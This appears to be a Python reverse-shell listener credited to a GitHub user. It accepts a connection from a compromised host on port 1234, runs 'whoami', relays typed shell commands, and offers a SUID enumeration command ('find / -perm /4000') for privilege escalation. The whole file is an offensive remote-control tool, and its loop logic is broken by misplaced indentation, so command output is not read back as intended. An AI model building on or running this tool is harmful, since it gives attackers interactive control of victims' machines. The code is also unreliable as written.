from termcolor import colored
import socket
host = "0.0.0.0"
port = 1234

s =socket.socket()
s.bind((host, port))
s.listen(1)
print("devlopped by @rafa_ailes_ on github")
print("[*]pylistener listing on ", host ,port, "\n")
client=s.accept()
print(colored(f"[*]one client connected {client[1]}\n", "red"))
print(colored("[*]getting shell...", "blue"))

# get target id 
#getuid = "id"
#get_id = client[0].send(getuid.encode())
#uid = client[0].recv(1024).decode()
#print(colored(uid,"blue")) 

#get active diretcorie
#pwd = "pwd"
#get_directorie = client[0].send(pwd.encode())
#directorie = client[0].recv(1024).decode()
#print(colored(f"directorie : {directorie}", "green"))

#get hostname
whoami = "whoami"
get_name = client[0].send(whoami.encode())
hostname = client[0].recv(1024).decode()
print(colored(f"hostname : {hostname}", "blue"))
while True:
    shell = input("$SHELL> ")
    result = client[0].send(shell.encode())
    if shell.lower() in ["q", "quit", "x", "exit", "close"]:
        break
    # help menu
    if shell.lower() == "help":
    	print(""" MENU
suid : get suid permissions

""")
    	
#find suid permitions
if shell.lower() == 'suid': 
    suid = "find / -perm /4000 2>/dev/null"
    find_suid = client[0].send(suid.encode())
    rsult = client[0].recv(5000).decode("utf-8")
    print(rsult)

	    
    result = client[0].recv(1024).decode()
    print(result)

client[0].close()

s.close()